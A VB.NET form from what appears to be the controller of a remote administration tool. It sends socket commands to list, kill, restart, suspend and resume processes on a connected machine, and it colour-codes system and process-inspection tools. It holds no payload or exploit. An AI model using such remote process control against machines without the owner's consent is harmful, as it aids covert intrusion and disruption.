Public Class Processmanager
    Dim state As Integer
    Dim time As Integer
    Public sock As Integer
    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        On Error Resume Next
        'Dim KeyIndex As Integer
        'KeyIndex = 1


        For Each Process As ListViewItem In ListView1.Items


            If Process.Text.Contains("csrss") Then

                Process.BackColor = Color.OrangeRed
            ElseIf Process.Text.Contains("svchost") Then
                Process.BackColor = Color.OrangeRed
            ElseIf Process.Text.Contains("System") Then
                Process.BackColor = Color.Red
            ElseIf Process.Text.Contains("winlogon") Then
                Process.ImageIndex = 1
                Process.BackColor = Color.OrangeRed
                'Dim aa = ListView1.View = (KeyIndex = 1)
            ElseIf Process.Text.Contains("lsm") Then
                Process.BackColor = Color.OrangeRed
            ElseIf Process.Text.Contains("wininit") Then
                Process.BackColor = Color.OrangeRed
            ElseIf Process.Text.Contains("IntelTechnologyAccessService") Then
                Process.BackColor = Color.OrangeRed

            ElseIf Process.Text.Contains("SearchIndexer") Then
                Process.BackColor = Color.OrangeRed
            ElseIf Process.Text.Contains("services") Then
                Process.BackColor = Color.OrangeRed
            ElseIf Process.Text.Contains("explorer") Then
                Process.ImageIndex = 2
                'Process.BackColor = Color.LightSteelBlue
            ElseIf Process.Text.Contains("chrome") Then
                Process.ImageIndex = 3
            ElseIf Process.Text.Contains("notepad") Then
                Process.ImageIndex = 4
            ElseIf Process.Text.Contains("cmd") Then
                Process.ImageIndex = 5
            ElseIf Process.Text.Contains("conhost") Then
                Process.ImageIndex = 5
            ElseIf Process.Text.Contains("firefox") Then
                Process.ImageIndex = 6
            ElseIf Process.Text.Contains("regedit") Then
                Process.ImageIndex = 7
            ElseIf Process.Text.Contains("WinRAR") Then
                Process.ImageIndex = 8
            ElseIf Process.Text.Contains("iexplore") Then
                Process.ImageIndex = 9
            ElseIf Process.Text.Contains("Skype") Then
                Process.ImageIndex = 10
            ElseIf Process.Text.Contains("smss") Then
                Process.BackColor = Color.OrangeRed
            ElseIf Process.Text.Contains("ProcessHacker") Then
                Process.ImageIndex = 11
            ElseIf Process.Text.Contains("taskmgr") Then
                Process.ImageIndex = 11
            ElseIf Process.Text.Contains("Process") Then
                Process.ImageIndex = 11
            ElseIf Process.Text.Contains("Spark") Then
                Process.ImageIndex = 12
            ElseIf Process.Text.Contains("procexp") Then
                Process.ImageIndex = 13
            ElseIf Process.Text.Contains("procexp64") Then
                Process.ImageIndex = 13
            ElseIf Process.Text.Contains("HWorks32") Then
                Process.ImageIndex = 14
            ElseIf Process.Text.Contains("Maxthon") Then
                Process.ImageIndex = 15
            ElseIf Process.Text.Contains("wordpad") Then
                Process.ImageIndex = 16

            End If

        Next




    End Sub

 

    Private Sub Processmanager_Load(sender As Object, e As System.EventArgs) Handles Me.Load



        Timer2.Enabled = True



        Main.S.Send(sock, "GetProcesses")



    End Sub

    Private Sub KillProcessToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles KillProcessToolStripMenuItem.Click
        Dim allprocess As String = ""
        For Each item As ListViewItem In ListView1.SelectedItems
            allprocess += (item.Text & "ProcessSplit")
        Next
        Main.S.Send(sock, "KillProcess" & Main.Yy & allprocess)

        ListView1.Items.Clear()
        Main.S.Send(sock, "GetProcesses")
    End Sub

    Private Sub RefreshToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RefreshToolStripMenuItem.Click




        ListView1.Items.Clear()
        Main.S.Send(sock, "GetProcesses")
        '    Threading.Thread.Sleep(100)

        Timer2.Enabled = True

    End Sub

    Private Sub RestartProcessToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RestartProcessToolStripMenuItem.Click
        Dim allprocess As String = ""
        For Each item As ListViewItem In ListView1.SelectedItems
            allprocess += (item.Text & "ProcessSplit")
        Next
        Main.S.Send(sock, "RestProcess" & Main.Yy & allprocess)
        ListView1.Items.Clear()
        Main.S.Send(sock, "GetProcesses")
    End Sub

    Private Sub SuspendToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles SuspendToolStripMenuItem.Click
        Dim allprocess As String = ""
        For Each item As ListViewItem In ListView1.SelectedItems
            allprocess += (item.Text & "ProcessSplit")
        Next
        Main.S.Send(sock, "SProcess" & Main.Yy & allprocess)
        ListView1.Items.Clear()
        Main.S.Send(sock, "GetProcesses")
    End Sub

    Private Sub ResumeProcessToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles ResumeProcessToolStripMenuItem.Click
        Dim allprocess As String = ""
        For Each item As ListViewItem In ListView1.SelectedItems
            allprocess += (item.Text & "ProcessSplit")
        Next
        Main.S.Send(sock, "SProcessr" & Main.Yy & allprocess)
        Main.S.Send(sock, "GetProcesses")
    End Sub

    Private Sub PropertiesToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles PropertiesToolStripMenuItem.Click
        prop()
    End Sub
    Private Sub prop()

        On Error Resume Next
        Dim f As New processprop

        f.Show()


        'f.Label1.Text = Label1.Text




        'Form9.Show()
        f.PictureBox1.Image = ImageList1.Images(ListView1.FocusedItem.ImageIndex)
        f.Text = ListView1.Items.Item(ListView1.FocusedItem.Index).SubItems.Item(0).Text

        f.TextBox1.Text = ListView1.Items.Item(ListView1.FocusedItem.Index).SubItems.Item(0).Text
        f.TextBox2.Text = ListView1.Items.Item(ListView1.FocusedItem.Index).SubItems.Item(1).Text

        f.TextBox4.Text = ListView1.Items.Item(ListView1.FocusedItem.Index).SubItems.Item(3).Text
       
        If f.TextBox4.Text = "" Then
            f.TextBox4.Text = "Running in Background"
        End If
     


    End Sub
End Class